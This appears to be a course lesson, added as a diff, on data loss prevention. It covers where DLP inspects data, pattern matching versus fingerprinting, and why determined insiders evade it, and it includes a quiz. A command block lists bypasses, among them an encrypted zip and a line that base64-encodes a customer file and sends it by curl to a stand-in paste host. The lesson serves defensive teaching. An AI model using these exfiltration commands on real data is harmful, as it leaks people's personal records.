@@ -1,0 +1,65 @@
+---
+title: Data Loss Prevention
+module: data-protection-and-privacy
+moduleTitle: Data Protection and Privacy
+moduleOrder: 53
+moduleIcon: FileLock
+order: 4
+summary: DLP is a smoke detector, not a vault door. It catches nearly every accident and slows a determined insider down by about ten minutes.
+estimatedMinutes: 18
+objectives:
+  - Map DLP inspection to data in motion, at rest, and in use
+  - Compare pattern matching against exact-data fingerprinting
+  - Name the bypasses that make DLP detection and friction, not prevention
+tags:
+  - dlp
+  - insider-threat
+  - exfiltration
+  - data-protection
+  - monitoring
+---
+
+An engineer who just gave two weeks notice uploads the full customer list to their personal Google Drive. Data loss prevention is the control that is supposed to catch that upload. Sometimes it does. Often it does not, because they zipped the file first, or renamed it to `vacation-photos.zip`, or pasted the rows into a web chat the DLP policy never covered. Knowing exactly when DLP catches an exfil and when it shrugs is the difference between trusting it and being surprised by it.
+
+DLP inspects data in three places. In motion, watching email, web uploads, and network egress for sensitive content leaving. At rest, scanning file shares and endpoints for sensitive data sitting somewhere it should not be. In use, an endpoint agent watching a user copy files to a USB stick, print them, or hit the clipboard. Microsoft Purview, Forcepoint, and the DLP built into most secure web gateways all cover some mix of these.
+
+How it decides what is sensitive matters more than where it looks. Regex and pattern matching catch structured data like card numbers and SSNs, and they are noisy because a lot of 16-digit strings are not cards. Exact data matching, sometimes called fingerprinting, is stronger: you feed DLP a hash of your actual customer database, and it fires only when those specific records move, which kills the false positives. Document fingerprinting does the same for whole files. If you only turn on regex, expect the SOC to drown in alerts about phone numbers.
+
+## Where it works, and where it quietly fails
+
+DLP is very good at accidents. The honest employee who emails a spreadsheet to `jsmith@gmail.com` instead of `jsmith@yourcorp.com`, the finance person who attaches the wrong workbook, the developer who pastes a config with real credentials into a public Stack Overflow question. Those are most real data-loss events, and DLP catches the overwhelming majority of them. That alone justifies deploying it.
+
+Against a determined insider, it leaks like a sieve. Content inspection cannot read what it cannot parse, so a password-protected zip is opaque to it. The policy can block all encrypted archives, but that also blocks the legitimate ones your business sends daily, and now you are in the tuning fight every DLP admin knows. Photographing the screen with a phone defeats it entirely. So does copy-pasting into a channel the policy does not monitor, or using a personal cloud client on an unmanaged device the agent was never installed on.
+
+<CommandBlock
+  title="the bypasses to understand, and how defenders seed detection"
+  commands={[
+    { cmd: "zip -e leak.zip customers.csv", comment: "encrypted archive that content inspection cannot read inside" },
+    { cmd: "base64 customers.csv | curl -d @- https://paste.example", comment: "re-encode to slip past a naive pattern match" },
+    { cmd: "echo 'canary token in row 40001' >> customers.csv", comment: "defenders plant fake records that alert the instant they surface" },
+  ]}
+/>
+
+That last line is the defender's real edge. A canary record, a fake customer whose email or account fires an alert the moment it is queried or appears anywhere outside the database, catches the exfil that content inspection missed. It works precisely because it does not rely on parsing the payload.
+
+<Callout type="security" title="Red-team DLP only with seeded data and written scope">
+If you are testing a DLP deployment, exfiltration attempts against a client's controls need explicit authorization in the rules of engagement. Never move real production PII off their environment, even to prove a bypass works. Use synthetic or canary records the client planted for the test. Demonstrating that you can smuggle out a seeded fake account proves the gap without turning your assessment into an actual breach of real people's data.
+
+</Callout>
+
+Run DLP in block mode too aggressively and you halt the business, so most shops run it in monitor-and-alert mode. That makes it a detection tool feeding your SOC, not a wall. The honest way to think about DLP is friction plus detection: it turns an insider's exfil from trivial into slightly annoying, and it catches almost every accident. It does not stop someone who has decided to steal and has ten minutes to think. The P in the name oversells it.
+
+<Quiz
+  id="dlp-encrypted-archive"
+  question="An insider password-protects a zip of the customer database before uploading it. What can content-inspection DLP actually do?"
+  answer={2}
+  options={[
+    "Read inside the archive and block the specific records",
+    "Decrypt the zip using the endpoint agent and inspect it",
+    "Nothing to the contents, at best flag or block encrypted archives by policy",
+    "Automatically recover the password and quarantine the file",
+  ]}
+  explanation="DLP inspects content it can parse. An encrypted archive is opaque, so it cannot see the records. The only lever is a blanket policy on encrypted archives, which also catches legitimate ones and forces a tuning tradeoff."
+/>
+
+<Notes />
